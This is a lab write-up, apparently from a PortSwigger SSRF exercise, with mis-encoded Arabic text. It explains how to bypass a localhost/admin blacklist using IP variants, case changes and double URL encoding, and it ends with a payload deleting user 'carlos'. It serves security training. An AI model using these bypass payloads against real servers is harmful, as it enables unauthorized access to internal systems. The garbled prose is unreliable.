# [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

- **ุงููุณุชูู:** PRACTITIONER
    
- **ุงูุญุงูุฉ:** Solved โ
    
- **ุงููุฏู:** ุชุฎุทู ุงูููุชุฑ (Blacklist) ูููุตูู ูู `http://localhost/admin` ูุญุฐู `carlos`.
    

---

## ๐ ุชุญููู ูุธุงู ุงูุญูุงูุฉ (Defenses)

ุงููุทูุฑ ูุถุน ุนุงุฆููู (Blacklist):

1. ููุน ูุชุงุจุฉ `127.0.0.1` ุฃู `localhost`.
    
2. ููุน ูููุฉ `admin` ุตุฑุงุญุฉู.
    

---

## ๐๏ธ ุฎุทูุงุช ุงูุญู (Exploitation)

### 1. ุชุฎุทู ุญูุงูุฉ ุงูู IP (IP Bypass)

ุนูุฏ ูุญุงููุฉ ุฅุฏุฎุงู `http://127.0.0.1/` ูุชู ุฑูุถ ุงูุทูุจ. ูููููุง ุงุณุชุฎุฏุงู ุจุฏุงุฆู ุจุฑูุฌูุงู ุจุชููููุง ุงูุฃูุธูุฉ:

- **ุงุณุชุฎุฏุงู ุงูุงุฎุชุตุงุฑ:** `http://127.1/` (ูุฏู ุงููู ุญู ุงููุงุจ).
    
- **ุงุณุชุฎุฏุงู ุงูู Decimal:** `http://2130706433/`.
    
- **ุงุณุชุฎุฏุงู ุงูู Hexadecimal:** `http://0x7f000001/`.
    

### 2. ุชุฎุทู ุญูุงูุฉ ุงููููุฉ (Word Bypass)

ุญุชู ุจุนุฏ ุงููุตูู ููุณูุฑูุฑุ ูููุฉ `/admin` ูุญุธูุฑุฉ. ุงูุญู ูู ุงูุชูููู (Obfuscation):

- **Double URL Encoding:** ุงูุณูุฑูุฑ ุจููู ุงูุชุดููุฑ ูุฑุฉ ูุงุญุฏุฉุ ููู ุจุนุชูุง ุญุฑู `a` ูุดูุฑ ูุฑุชููุ ุงูููุชุฑ ููุดููู ูุต ุนุงุฏูุ ูููุง ููุตู ููุณูุฑูุฑ ุงูุฏุงุฎูู ููููู ูููุฑุฃู `admin`.
    
    - ุญุฑู `a` ุชุดููุฑู ุงูุฃูู: `%61`
        
    - ุงูุชุดููุฑ ุงูุซุงูู (ููู `%` ููุณูุง): `%2561`
        
    - ุงููุณุงุฑ ุงูููุงุฆู: `http://127.1/%2561dmin`
        

---

## ๐ก ุญููู ูุทุฑู ุชุฎุทู ุฅุถุงููุฉ (Bypass Checklist)

ูู ุตุงุฏูุช ููุชุฑ ุฃูููุ ุฌุฑุจ ุงูุทุฑู ุฏู ุจุงูุชุฑุชูุจ

### ุฃ- ุงูุชูุงุนุจ ุจุญุงูุฉ ุงูุฃุญุฑู (Case Sensitivity)

ุณุงุนุงุช ุงูููุชุฑ ุจูุฏูุฑ ุนูู `admin` ุณููู ุจุณุ ูุชูุฏุฑ ุชุฌุฑุจู ูุฏุฉ:

- `/Admin`
    
- `/ADMIN`
    
- `/aDmIn`
    

### ุจ- ุงุณุชุฎุฏุงู ุงูู URL Encoding ุงููุฎุชูู

- **URL Encoding:** `/adm%69n`
    
- **Double Encoding:** `/%2561dmin`
    

### ุฌ- ุทุฑู ุชุฎุทู ุงูู Localhost (IP Variations)

| **ุงูุทุฑููุฉ**       | **ุงูู Payload**                                 |
| ----------------- | ----------------------------------------------- |
| **CIDR Bypass**   | `http://127.127.127.127`                        |
| **IPv6**          | `http://[::1]`                                  |
| **Domain Bypass** | `http://local.gd` ุฃู `http://spoofed.localhost` |
| **Dotless IP**    | `http://2130706433`                             |

---

## ๐ฏ ุงูุชูููุฐ ุงูููุงุฆู (Final Payload)

ูุญู ุงููุงุจ ูุญุฐู ุงููุณุชุฎุฏู ูุจุงุดุฑุฉ:

```URL
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

---

> **ูุตูุญุฉ ูููุณุชูุจู:** ุฏุงููุงู ูู ุงูู SSRFุ ูู ูููุช ููุชุฑุ ุฃูู ุญุงุฌุฉ ููุฑ ูููุง ูู **Double Encoding** ุฃู ุชุบููุฑ ุดูู ุงูู IPุ ูุฃู ุฏู ุฃูุชุฑ ุบูุทุงุช ุจููุน ูููุง ุงููุจุฑูุฌูู.

